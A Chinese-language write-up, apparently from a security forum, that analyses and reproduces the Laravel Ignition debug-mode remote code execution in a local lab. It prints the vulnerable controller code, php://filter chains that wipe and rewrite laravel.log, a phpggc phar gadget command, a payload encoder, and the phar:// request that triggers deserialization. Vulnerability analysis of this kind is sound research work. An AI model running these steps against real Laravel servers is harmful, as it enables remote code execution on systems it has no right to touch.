<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [xz.aliyun.com](https://xz.aliyun.com/t/9030#toc-7)

测试环境
----

*   OS: `MAC OS`
*   PHP: `7.3.18`
*   Laravel：`8.22.0`

环境搭建
----

根据原文（[https://www.ambionics.io/blog/laravel-debug-rce](https://www.ambionics.io/blog/laravel-debug-rce)）的搭建方式，把服务开起来。  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20210114180340-c6b7c920-564f-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210114180340-c6b7c920-564f-1.jpg)  
访问`http://127.0.0.1:8000/`  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20210114180405-d61ad3ee-564f-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210114180405-d61ad3ee-564f-1.jpg)  
可以看到这时候`Ignition`（Laravel 6 + 默认错误页面生成器）给我们提供了一个 solutions，让我们在配置文件中给 Laravel 配置一个加密 key。  
点击按钮后会发送一个请求  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20210114180424-e0e1146e-564f-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210114180424-e0e1146e-564f-1.jpg)  
通过这个请求`Ignition`成功在配置文件中生成了一个 key。  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20210114180437-e8a70ea6-564f-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210114180437-e8a70ea6-564f-1.jpg)  
接着页面就可以正常访问了，环境也就搭建完了  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20210114180447-ef0c2d1c-564f-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210114180447-ef0c2d1c-564f-1.jpg)

漏洞分析
----

漏洞其实就是发生在上面提到的`Ignition`（<=2.5.1）中，`Ignition`默认提供了以下几个 solutions。  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20210114180458-f5a37144-564f-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210114180458-f5a37144-564f-1.jpg)  
通过这些 solutions，开发者可以通过点击按钮的方式，快速修复一些错误。  
本次漏洞就是其中的`vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php`过滤不严谨导致的。  
首先我们到执行 solution 的控制器当中去，看看是如何调用到 solution 的

```
<?php

namespace Facade\Ignition\Http\Controllers;

use Facade\Ignition\Http\Requests\ExecuteSolutionRequest;
use Facade\IgnitionContracts\SolutionProviderRepository;
use Illuminate\Foundation\Validation\ValidatesRequests;

class ExecuteSolutionController
{
    use ValidatesRequests;

    public function __invoke(
        ExecuteSolutionRequest $request,
        SolutionProviderRepository $solutionProviderRepository
    ) {
        $solution = $request->getRunnableSolution();

        $solution->run($request->get('parameters', []));

        return response('');
    }
}


```

接着调用 solution 对象中的`run()`方法，并将可控的`parameters`参数传过去。通过这个点我们可以调用到`MakeViewVariableOptionalSolution::run()`

```
<?php

namespace Facade\Ignition\Solutions;

use Facade\IgnitionContracts\RunnableSolution;
use Illuminate\Support\Facades\Blade;

class MakeViewVariableOptionalSolution implements RunnableSolution
{
    ...
    public function run(array $parameters = [])
    {
        $output = $this->makeOptional($parameters);
        if ($output !== false) {
            file_put_contents($parameters['viewFile'], $output);
        }
    }

    public function makeOptional(array $parameters = [])
    {
        $originalContents = file_get_contents($parameters['viewFile']);

        $newContents = str_replace('$'.$parameters['variableName'], '$'.$parameters['variableName']." ?? ''", $originalContents);

        $originalTokens = token_get_all(Blade::compileString($originalContents));
        $newTokens = token_get_all(Blade::compileString($newContents));

        $expectedTokens = $this->generateExpectedTokens($originalTokens, $parameters['variableName']);

        if ($expectedTokens !== $newTokens) {
            return false;
        }

        return $newContents;
    }

    protected function generateExpectedTokens(array $originalTokens, string $variableName): array
    {
        $expectedTokens = [];
        foreach ($originalTokens as $token) {
            $expectedTokens[] = $token;
            if ($token[0] === T_VARIABLE && $token[1] === '$'.$variableName) {
                $expectedTokens[] = [T_WHITESPACE, ' ', $token[2]];
                $expectedTokens[] = [T_COALESCE, '??', $token[2]];
                $expectedTokens[] = [T_WHITESPACE, ' ', $token[2]];
                $expectedTokens[] = [T_CONSTANT_ENCAPSED_STRING, "''", $token[2]];
            }
        }

        return $expectedTokens;
    }
}


```

可以看到这里主要功能点是：读取一个给定的路径，并替换`$variableName`为`$variableName ?? ''`，之后写回文件中。  
由于这里调用了`file_get_contents()`，且其中的参数可控，所以这里可以通过`phar://`协议去触发 phar 反序列化。  
如果后期利用框架进行开发的人员，写出了一个文件上传的功能。那么我们就可以上传一个恶意 phar 文件，利用上述的`file_get_contents()`去触发 phar 反序列化，达到 rce 的效果。

### phar 反序列化

从 phpggc 里拿一条 laravel 中存在的拓展的链子。

```
./phpggc monolog/rce1 call_user_func phpinfo --phar phar -o /Applications/MxSrvs/www/laravel/phar.gif


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210114180543-105fb2b8-5650-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210114180543-105fb2b8-5650-1.jpg)  
是可以成功利用的。  
但是原文作者给出了一种基于框架触发 phar 反序列化的方法：将 log 文件变成合法的 phar 文件。

### log 转 phar

先来看看正常的 log 文件长什么样

*   `/storage/logs/laravel.log`

```
[2021-01-14 04:32:43] local.ERROR: file_get_contents(AA): failed to open stream: No such file or directory {"exception":"[object] (ErrorException(code: 0): file_get_contents(AA): failed to open stream: No such file or directory at /Applications/MxSrvs/www/laravel/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php:75)
[stacktrace]
#0 [internal function]: Illuminate\\Foundation\\Bootstrap\\HandleExceptions->handleError(2, 'file_get_conten...', '/Applications/M...', 75, Array)
#1 /Applications/MxSrvs/www/laravel/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php(75): file_get_contents('AA')
#2 /Applications/MxSrvs/www/laravel/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php(67): Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution->makeOptional(Array)
#3 /Applications/MxSrvs/www/laravel/vendor/facade/ignition/src/Http/Controllers/ExecuteSolutionController.php(19): Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution->run(Array)
#4 /Applications/MxSrvs/www/laravel/vendor/laravel/framework/src/Illuminate/Routing/ControllerDispatcher.php(48): Facade\\Ignition\\Http\\Controllers\\ExecuteSolutionController->__invoke(Object(Facade\\Ignition\\Http\\Requests\\ExecuteSolutionRequest), Object(Facade\\Ignition\\SolutionProviders\\SolutionProviderRepository))
#5 /Applications/MxSrvs/www/laravel/vendor/laravel/framework/src/Illuminate/Routing/Route.php(254): Illuminate\\Routing\\ControllerDispatcher->dispatch(Object(Illuminate\\Routing\\Route), Object(Facade\\Ignition\\Http\\Controllers\\ExecuteSolutionController), '__invoke')
#6 /Applications/MxSrvs/www/laravel/vendor/laravel/framework/src/Illuminate/Routing/Route.php(197): Illuminate\\Routing\\Route->runController()
...
#34 /Applications/MxSrvs/www/laravel/vendor/laravel/framework/src/Illuminate/Foundation/Http/Kernel.php(110): Illuminate\\Foundation\\Http\\Kernel->sendRequestThroughRouter(Object(Illuminate\\Http\\Request))
#35 /Applications/MxSrvs/www/laravel/public/index.php(52): Illuminate\\Foundation\\Http\\Kernel->handle(Object(Illuminate\\Http\\Request))
#36 /Applications/MxSrvs/www/laravel/server.php(21): require_once('/Applications/M...')
#37 {main}
"}

```

#### 清空 log 文件

作者在文章中提出了使用`php://filter`中的`convert.base64-decode`过滤器的特性，将 log 清空。  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20210114180613-225f3d12-5650-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210114180613-225f3d12-5650-1.jpg)  
可以看到`convert.base64-decode`过滤器会将一些非 base64 字符给过滤掉后再进行`decode`，所以可以通过调用多次`convert.base64-decode`多次触发该特性来将 log 清空。  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20210114180628-2b0f5618-5650-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210114180628-2b0f5618-5650-1.jpg)  
但是这样做其实会出现一些非预期的问题  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20210114180645-35675642-5650-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210114180645-35675642-5650-1.jpg)  
如果在某次 decode 时，`=`号后面出现了别的 base64 字符，那么 php 是会报一个 Warning 的。且由于 laravel 开启了 debug 模式，所以会触发`Ignition`生成错误页面，导致 decode 后的字符没有成功写入。  
根据这个思路的原理，我们可以将清空日志分成两个步骤：

1.  使 log 文件尽量变成非 base64 字符
2.  通过`convert.base64-decode`将所有非 base64 字符 decode，达到清空的目的

作者在第一步使用的方法为多次`convert.base64-decode`，但是这样可能会在其中的某一环报上面提到的错误。所以我们可以想办法找到另外一种方式达到第一步的目的。  
原 log 文件  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20210114180702-3f5b55ae-5650-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210114180702-3f5b55ae-5650-1.jpg)

1.  使用`convert.iconv.utf-8.utf-16be`(UTF-8 -> UTF-16BE)  
    [![](https://xzfile.aliyuncs.com/media/upload/picture/20210114180742-574adf90-5650-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210114180742-574adf90-5650-1.jpg)
    
2.  使用`convert.quoted-printable-encode`(打印所有不可见字符)  
    [![](https://xzfile.aliyuncs.com/media/upload/picture/20210114180818-6c805c3c-5650-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210114180818-6c805c3c-5650-1.jpg)
    
3.  使用`convert.iconv.utf-16be.utf-8`(UTF-16BE -> UTF-8)  
    [![](https://xzfile.aliyuncs.com/media/upload/picture/20210114180835-76f330b8-5650-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210114180835-76f330b8-5650-1.jpg)

可以看到经过这样操作后 log 文件中所有字符变成了非 base64 字符，这时候再使用`convert.base64-decode`过滤器就可以成功清空了。  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20210114180857-840bbebe-5650-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210114180857-840bbebe-5650-1.jpg)

将上述链条和起来就是  
`php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log`  
这样我们就完成了第一步。

#### 写入符合规范的 phar 文件

我们可以通过这里的`file_get_contents()`去触发日志的记录  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20210114180929-973cd662-5650-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210114180929-973cd662-5650-1.jpg)  
通过观察，我们可以发现 log 文件的格式其实是下面这样子的

```
[时间] [某些字符] PAYLOAD [某些字符] PAYLOAD [某些字符] 部分PAYLOAD [某些字符]

```

我们的 PAYLOAD 会在 log 文件中完整出现两次，我们最终需要让 log 文件变成我们的恶意 Phar 文件。所以我们还得继续对 log 文件进行操作。

原作者给出了一种使用`convert.iconv.utf-16le.utf-8`将 utf-16 转成 utf-8 的方案  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20210114180952-a4d79bfe-5650-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210114180952-a4d79bfe-5650-1.jpg)  
但是这里出现了两次 PAYLOAD，我们可以在 PAYLOAD 后面添加一个字符，使得 utf-16 转成 utf-8 时总有一个 PAYLOAD 能被转换出来。  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20210114181020-b5555994-5650-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210114181020-b5555994-5650-1.jpg)  
这样子就是我们预期的效果，因为除了 PAYLOAD 的部分都是非 base64 字符，只要我们将 PAYLOAD 进行 base64 编码后再 decode 即可把非 base64 字符消除掉。  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20210114181037-bf4d63a6-5650-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210114181037-bf4d63a6-5650-1.jpg)  
但是这么做还会有一个问题，就是在`file_get_contents()`传入`\00`的时候 php 会报一个 Warning，同样会触发 Debug 页面的报错。所以还得想办法将空字节（`\00`）写入到 log 中。

好在 php 为了将不可见字符打印出来，给出了一个`convert.quoted-printable-encode`过滤器  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20210114181104-cfb8d8b0-5650-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210114181104-cfb8d8b0-5650-1.jpg)  
原理就是将字符转成 ascii 后前面加个`=`号，将其打印出来。  
而与之对应的`convert.quoted-printable-decode`过滤器，则是相反。  
原理是将等于号后面的 ascii 字符解码后，打印出来。  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20210114181120-d8f151e6-5650-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210114181120-d8f151e6-5650-1.jpg)  
所以我们可以使用`=00`代替`\00`传入到`file_get_contents()`中  
所以完整和起来就是如下这样

```
php://filter/read=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=test.txt

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210114181136-e2e0e702-5650-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210114181136-e2e0e702-5650-1.jpg)  
这样就可以成功过滤掉其他干扰字符，将 PAYLOAD 送到 log 文件中。

### 踩坑

#### 坑点 1

如果直接根据作者给出的方式生成 PAYLOAD，在到`convert.quoted-printable-decode`过滤器的时候可能会出问题。  
因为 base64 编码的特殊性，有时候在编码后的字符串后面会出现`=`号，而使用`convert.quoted-printable-decode`过滤器时会匹配`=`号后面的 ascii 字符，如果没匹配到则会报错。  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20210114181204-f3139eb2-5650-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210114181204-f3139eb2-5650-1.jpg)  
所以我们需要将`=`号利用`=3d`来替换  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20210114181225-ffe23af4-5650-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210114181225-ffe23af4-5650-1.jpg)

#### 坑点 2

上面提到了，我们的 PAYLOAD 在 log 文件中除了完整的两次，还有一部分的 PAYLOAD 也会出现在 log 文件中  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20210114181254-11242066-5651-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210114181254-11242066-5651-1.jpg)  
可以看到这里，在最后面的`=`号后的 ascii 字符被省略了，导致`convert.quoted-printable-decode`过滤器再次报错，所以我们可以把第一个字符`P`转成对应的`=50`，从而让这里的`=`号都能匹配上。  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20210114181312-1ba09a6a-5651-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210114181312-1ba09a6a-5651-1.jpg)

总结以上的坑点，发现都是`=`号匹配不上的问题，所以干脆直接将 payload 都进行一次`convert.quoted-printable-encode`编码。

写入
--

我们先来尝试写入一些普通字符

#### 清空 log 文件

```
viewFile: php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210114181338-2b61e990-5651-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210114181338-2b61e990-5651-1.jpg)

#### 给 log 添加一条前缀

```
viewFile: AA

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210114181355-35cbc34c-5651-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210114181355-35cbc34c-5651-1.jpg)

#### 第三步：将需要写入的字符编码

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210114181412-3fd881c2-5651-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210114181412-3fd881c2-5651-1.jpg)

#### 第四步：将编码后的字符写入到 log 中

```
viewFile: =55=00=45=00=46=00=5A=00=54=00=45=00=39=00=42=00=52=00=41=00=3D=00=3D=00

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210114181427-48dc0474-5651-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210114181427-48dc0474-5651-1.jpg)

#### 第五步：清空干扰字符

```
viewFile: php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210114181441-50c927ca-5651-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210114181441-50c927ca-5651-1.jpg)

成功写入了任意字符，log 文件的内容我们可控了。

完整利用
----

在 laravel 的依赖里面找一条能够 rce 的链，如`monolog/rce1`。生成对应的 phar 文件，并将 phar 文件 base64 编码。

```
php -d'phar.readonly=0' ./phpggc monolog/rce1 call_user_func phpinfo --phar phar -o php://output | base64 -w0

PD9waHAgX19IQUxUX0NPTV ... gAAAEdCTUI=


```

再将该 base64 编码后的字符进行`convert.quoted-printable-encode`编码

```
Python 3.9.0 (default, Nov 21 2020, 14:01:50)
[Clang 12.0.0 (clang-1200.0.32.27)] on darwin
Type "help", "copyright", "credits" or "license" for more information.
>>> import base64
>>> s = 'PD9waHAgX19IQUxUX0NPTV ... gAAAEdCTUI='
>>> ''.join(["=" + hex(ord(i))[2:] + "=00" for i in s]).upper()
'=50=00=44=00=39= ... 00=55=00=49=00=3D=00'
>>>


```

#### 写入到 log 文件

```
viewFile: =50=00=44=00=39= ... 00=55=00=49=00=3D=00

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210114181459-5b7b0cc4-5651-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210114181459-5b7b0cc4-5651-1.jpg)

#### 清空干扰字符

```
viewFile: php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210114181515-6564bfaa-5651-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210114181515-6564bfaa-5651-1.jpg)

#### 触发 phar 反序列化

```
viewFile: phar:///Applications/MxSrvs/www/laravel/storage/logs/laravel.log/test.txt

```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210114181531-6e7dac3c-5651-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20210114181531-6e7dac3c-5651-1.jpg)

最后
--

至此整个漏洞就都分析复现完了，原文章中作者没有把一些坑点讲出来，导致复现的时候出现了很多非预期的 bug。但是整体的思路还是非常厉害的。  
除此之外，作者在最后还提到了一种利用 ftp 被动模式攻击 php-fpm 的方法，可以通过编写一个恶意的 ftp 服务端来实现。也是一种十分开脑洞的方法。

参考链接：  
[LARAVEL <= V8.4.2 DEBUG MODE: REMOTE CODE EXECUTION](https://www.ambionics.io/blog/laravel-debug-rce)